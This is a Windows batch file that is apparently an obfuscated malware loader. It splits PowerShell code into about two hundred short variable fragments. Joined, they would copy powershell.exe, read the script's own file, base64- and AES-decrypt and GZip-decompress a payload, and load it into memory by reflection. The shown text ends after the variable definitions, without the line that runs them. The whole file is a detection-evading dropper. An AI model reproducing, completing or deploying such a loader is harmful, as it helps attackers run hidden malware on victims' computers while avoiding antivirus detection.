@echo off
set "osZsBUAxBk=po"
set "mTnIaYHrpH=0\"
set "USKCYRVQtC=py"
set "hldLamfkRJ=32"
set "XSzAPlGiyR=.e"
set "IFWPsxYlNW=do"
set "UrCdRSXVyJ=he"
set "ZOSmUpktHG=he"
set "MkTNbkOLrm=we"
set "MLlFITLLYB=s\"
set "KNwbrsKism=ws"
set "RPBhFgorxI=y "
set "MPbpbcaORO=we"
set "UkoLwxSXGX=ll"
set "mMXskzTIZh=ll"
set "TuiqGENduI=Wi"
set "IcWOiQXnKh=st"
set "dlScWbneTm=em"
set "QsXmeWKPbz=Sy"
set "NzKBgSXcmR=nd"
set "PLAKJJPxwR=\W"
set "RHhlUGOaux= /"
set "LEJAhibZAf=rS"
set "DZQfBHghTi=\v"
set "hsrYkXXOvM=xe"
set "MZIsuavsNa=co"
set "lQHbrJkmnv=Po"
set "IkLiAvIQWi=1."
set "vurisFfjFN=:\"
set "RdMRUJMifD=rs"
set "EdxVFzABks=ow"
set "VxbRxFzVqd=in"
set "oUcFgDvsVR= C"
set "hSdmfljdJH= %~dp0"
set "MPRrDuBnvX=cd"
set "VrXOzeJZNo=R = "
set "hwBGFjmnkF=D.Su"
set "vlAClUVkia=oint"
set "IJRKpsYQRT=QuhC"
set "mRMjKBIFqM=Syst"
set "bNOBeMeQvT=.Cop"
set "TcrfuYZPvW=::('"
set "fgMXJzsbvP=xQhR"
set "KULkliEaIn=vert"
set "NKKKyMuKSe=rity"
set "zizfnrEgkE=ke($"
set "HvhPhtLzsb=gnir"
set "mbfCXXFYcI=onve"
set "RxsmOpzGCJ=.Dis"
set "SQSbzcIile=);$b"
set "WKnEFjifIB=NWrB"
set "uCfDhLbmAk=:('g"
set "WbfzBQGQkL=gMod"
set "TJIAYQuqbJ=$Lyv"
set "gnAjkJMhGd=join"
set "QMopTAcwug=pres"
set "ipBoRlXscM=7;$b"
set "BQySOxVxOr=bstr"
set "cBcDTWsmif=t Sy"
set "fKldkAZexZ=ach "
set "NBIZBfksUH=ateD"
set "kIFAHwIuGU=brea"
set "OldzuwNMUi=F'[-"
set "VaPOREmcHp=New-"
set "qWHVWbVAkN=KwA."
set "nhmZdlhXAT=[-1."
set "GNRQGPcERj=Disp"
set "OAnerNKYeW=6] -"
set "EXOkgODEfL=ZN);"
set "eJvhxycnFe=k; }"
set "TEHVBokNNa=KwA "
set "QOUoFSeIIO=('%~f0'"
set "TVTHwCVdGM=nirt"
set "kLdMJxMAbQ=QuhC"
set "EInWcrhYTb=comm"
set "BSBHJeCbfc=-nop"
set "iGUCUPIQsq=and "
set "dfDmUcUMCJ=raph"
set "FkmViTQtEt=ptog"
set "YRTAPEunFy=File"
set "iXkkgXdTGF=$FxQ"
set "ntjxIAtkCZ=.Mem"
set "bjiXojtaeC=)($F"
set "KpDsLXowaX===')"
set "PYvzcuBXtr=$FOC"
set "hUsNEATFnK=();$"
set "IjvDyXtPUL=ck($"
set "zuolNXacoQ=em.I"
set "reroXgIIRx=.Cre"
set "nbDokscKzQ=Etk/"
set "BmBZAoXakp=form"
set "dKNrqaLshI=oin "
set "vjHZlrbMvZ=.Con"
set "wOHwWElfbs=O.Me"
set "qCKaNZwpcJ=P4Ia"
set "IxAKrhaRik=();$"
set "hfBFdpoYnE=3); "
set "IoYpFFkeVA=oryS"
set "VLGBDfUQxf==');"
set "DZXvlwdely=-Obj"
set "ngnvsahjye=tnmI"
set "boBFIjktpX=pStr"
set "OPdXbHAJvQ= '')"
set "zwToaLVGnK=fore"
set "wDaSjOFMPZ= [st"
set "BKiROxgYwV=rB.D"
set "iwilgfaYHk=ss -"
set "FezSUlAoXZ=iron"
set "pDDYdjBpya=pNWr"
set "ijZaiRDwyR=('%*'"
set "yFSUnfKHol=hR);"
set "KWvubLBnNW=DuQV"
set "gXHPoRWnUD=ispo"
set "jdMLeNpkZM=Comp"
set "HwLOaQZxVM=rity"
set "IcsluiRNCS=se()"
set "ByKmGGWYVn=:: '"
set "caSmVeViGV=);$F"
set "fkQrBSoDJR=v) {"
set "WQAZJMgGCY=ode]"
set "JAIEvXswLP=gOnM"
set "qcfEKmdvHt=[Sys"
set "HkvmnKIHDC=flec"
set "gDHDNyIeuv=bQuh"
set "ZpeifANrEu=gth)"
set "SuXeAoeuWD=rtS4"
set "UbFjAparVk=2Q+X"
set "DqoTaqHqDp=[IO."
set "RSVUvoyOWs=ring"
set "MQFTNwWQfj= = $"
set "wbTekpOOhz=yste"
set "MaxbtnfChe=ose("
set "zFADAJsSPu=tem."
set "gTnEQsVFpp=$bQu"
set "usmvWJSfIz=.Mod"
set "XsCrYmqMSc=join"
set "JVHjikEhgx= '')"
set "ndREDcQwru=y.Pa"
set "BxFpzBCFrq= [Sy"
set "AFDhPYUxFc=9tpc"
set "JqSYMMnOKK=mory"
set "ptVTJrvqKZ=ptor"
set "GtIuQeLCtt=] -j"
set "LntbtYEQNg=eam("
set "AIilTQIzLZ= New"
set "xOEazJPpOm=e = "
set "gDGUzUyRjZ='h6b"
set "EbFEJchxQI=Syst"
set "qGJDdPVRui=QuhC"
set "ifDxIKVrfZ=pher"
set "WkmSIwyGmX=Mode"
set "bEnLevTrea=d;$b"
set "frkzUYBfDj=BC;$"
set "GJunbBgVKW=ing("
set "cqCnxvoSPy=; };"
set "CbFChlScWY=f = "
set "CqbGyrSdUo=wfBW"
set "NxBlbyXfug=FxQh"
set "nsMpBoNAOs=ct S"
set "fluNwrMuZq=ew-O"
set "nyZjjJzJZL=-joi"
set "bwOJMazyTo=rofi"
set "BwuUnvyGnj=LyvC"
set "valFtFIXLo=QuhC"
set "PTsGLWaFXk=ress"
set "DYbBDnDCPT='')("
set "JYTlRzwLgo=tion"
set "jQQkDiTZkr=$FOC"
set "LHHmXcVPWU=)))"
set "ItrdXppaJl=gOnM"
set "hYslUKWBum=saBm"
set "qbstUdUwzk=ionM"
set "FxzcNsFaHS=Comp"
set "vwEuOUOSJO=embl"
set "KTKeRkAdkF=FxQh"
set "KDcrLFEwhV=-1.."
set "IHOVcUCHNL=.-16"
set "DMygYxCJoi=y]::"
set "bBSOVCtIrf=e]::"
set "ReyVkdbyQN=mID."
set "wTsRhzYySz=Obje"
set "sewhNsSeLp=em.C"
set "ENHvrhKtRa=comp"
set "qyFxfpNYIl= = $"
set "QDqjZTbpCQ=.Len"
set "UvRDZyATNi=le  "
set "xjFqiDfiVz=stem"
set "wDyObUbkwA=;$ab"
set "MFqSRhFGcZ=('KY"
set "CNPnzGedSN=raph"
set "EasXojomjG=.GZi"
set "wMFIfqfrhf== $b"
set "eQPXjFGpTz=('da"
set "DOIEDwgcna=Secu"
set "fbgEMFElln=esaB"
set "QxYfDyWHJx=Fina"
set "QkuGheqcVZ=qddu"
